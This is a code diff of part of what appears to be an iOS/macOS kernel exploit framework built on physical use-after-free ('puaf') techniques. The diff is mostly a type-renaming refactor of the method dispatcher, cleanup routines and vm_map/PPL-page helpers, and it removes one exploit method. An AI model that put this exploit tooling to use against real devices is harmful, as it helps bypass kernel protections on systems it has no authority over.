@@ -8,13 +8,12 @@
 #include <stdio.h>
 #include "puaf.h"
 
-void puaf_init(struct kfd* kfd, uint64_t puaf_pages, uint64_t puaf_method)
+void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
 {
     kfd->puaf.number_of_puaf_pages = puaf_pages;
-    kfd->puaf.puaf_pages_uaddr = (uint64_t*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(uint64_t)));
+    kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));
 
     switch (puaf_method) {
-        puaf_method_case(landa)
         puaf_method_case(physpuppet)
         puaf_method_case(smith)
     }
@@ -42,17 +41,21 @@ void puaf_free(struct kfd* kfd)
 {
     kfd->puaf.puaf_method_ops.free(kfd);
 
-    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(uint64_t));
+    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(u64));
 
     if (kfd->puaf.puaf_method_data) {
         bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
     }
 }
 
-void puaf_helper_get_vm_map_first_and_last(uint64_t* first_out, uint64_t* last_out)
+/*
+ * Helper puaf functions.
+ */
+
+void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
 {
-    uint64_t first_address = 0;
-    uint64_t last_address = 0;
+    u64 first_address = 0;
+    u64 last_address = 0;
 
     vm_address_t address = 0;
     vm_size_t size = 0;
@@ -82,7 +85,7 @@ void puaf_helper_get_vm_map_first_and_last(uint64_t* first_out, uint64_t* last_o
     *last_out = last_address;
 }
 
-void puaf_helper_get_vm_map_min_and_max(uint64_t* min_out, uint64_t* max_out)
+void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
 {
     task_vm_info_data_t data = {};
     task_info_t info = (task_info_t)(&data);
@@ -97,14 +100,14 @@ void puaf_helper_give_ppl_pages(void)
 {
     timer_start();
 
-    const uint64_t given_ppl_pages_max = 10000;
-    const uint64_t l2_block_size = (1ull << 25);
+    const u64 given_ppl_pages_max = 10000;
+    const u64 l2_block_size = (1ull << 25);
 
     vm_address_t addresses[given_ppl_pages_max] = {};
     vm_address_t address = 0;
-    uint64_t given_ppl_pages = 0;
+    u64 given_ppl_pages = 0;
 
-    uint64_t min_address, max_address;
+    u64 min_address, max_address;
     puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);
 
     while (true) {
@@ -127,7 +130,7 @@ void puaf_helper_give_ppl_pages(void)
         }
     }
 
-    for (uint64_t i = 0; i < given_ppl_pages; i++) {
+    for (u64 i = 0; i < given_ppl_pages; i++) {
         assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
     }
 
